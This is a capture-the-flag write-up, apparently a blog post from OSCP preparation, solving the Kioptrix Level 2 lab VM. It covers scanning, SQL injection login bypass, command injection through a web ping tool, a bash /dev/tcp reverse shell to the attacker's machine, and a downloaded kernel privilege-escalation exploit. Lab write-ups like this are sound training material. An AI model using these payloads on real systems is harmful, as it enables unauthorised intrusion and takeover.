---
title: "Kioptrix Level 1.1 (#2)"
date: 2017-02-25 12:52:16 +0000
comments: true
categories: challenges
tags: challenges
---

So im adding all the writeups I did leading up to OSCP following on with Kioptrix level 2.

**Name:** Kioptrix: Level 1.1 (#2)

**Date release:** 11 Feb 2011

**Author:** Kioptrix

**Series:** Kioptrix

**Web page:**[http://www.kioptrix.com/blog/?page_id=135 ](http://www.kioptrix.com/blog/?page_id=135)

**Vulnhub:** [https://www.vulnhub.com/entry/kioptrix-level-11-2,23/](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

**Description:**

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
This is the second release of #2. First release had a bug in it with the web application



<!-- more -->

## Host Discovery

`arp-scan -l`

## Port Scanning

### TCP

`nmap -F -sS 192.168.0.18`

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/1.png)

I also ran a more indepth scan 

`nmap -sS -A -sC -p0- -oA nmap_tcp_full_sCA_192.168.0.18 192.168.0.18`

### UDP

I decided to use nmap to run a scan of full UDP ports playing with the timing switches

`nmap --min-parallelism 100 --min-rtt-timeout 26ms --max-rtt-timeout 160ms --max-retries 2 --max-scan-delay 0 --min-rate 1000 -p0- -sU -oA nmap_udp_full 192.168.0.18`


```bash
PORT    STATE SERVICE
111/udp open  rpcbind
```

## Service Enumeration

### 80 - http

### 443 - https

http://192.168.0.18/ - a login page

`nikto -h 192.168.0.18`

```bash
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.!
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/assets/images/: Directory indexing found.![]
+  /icons/README: Apache default file found.![]
+ Server: Apache/2.0.52 (CentOS)
```

### 3306 - mysql

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/2.png)

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/3.png)

## Exploitation

So it looks like we need to try and get past the login page.

At this point i decided to start fuzzing the login page to try and find an injection flaw. I was able to successfully login using the value below in the username and password fields.

`' or 1=1--`

Using SQL injection to supply a truestatement in the username and password fields logged us in sucessfully :D

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/4.png)

We get a simple web based ping tool

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/5.png)

The ping tool works 

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/6.png)

It seems like the OS ping command is being used to carry out this task. 

Looks like we can abuse this feild to get code execution.

`127.0.0.1; whoami` 

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/7.png)

Lets try get a shell :P

netcat listener is setup on the attacking kali machine (192.168.0.21).

`nc -nlvp 4444`

Now we inject our payload

`127.0.0.1; bash -i >& /dev/tcp/192.168.0.21/4444 0>&1`

Boom! we get a shell but its as a low privileged user apache

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/8.png)

## Privilege Esculation

we are in but its not good enoughh want root!

using g0m1lks privilege escalation guide we start to look for a way to escalate


[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/9.png)

I noticed the target is running a vulnerable Linux kernel

**searchsploit** was used to find a priv esc exploit

**Exploit Used:** [https://www.exploit-db.com/exploits/9542/](https://www.exploit-db.com/exploits/9542/)

The exploit was downloaded and transferred over to the target using wget

compiled using gcc on the target

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/10.png)

Time to execute

![alt text]({{ site.baseurl }}/assets/images/kioptrix2/11.png)

got root :P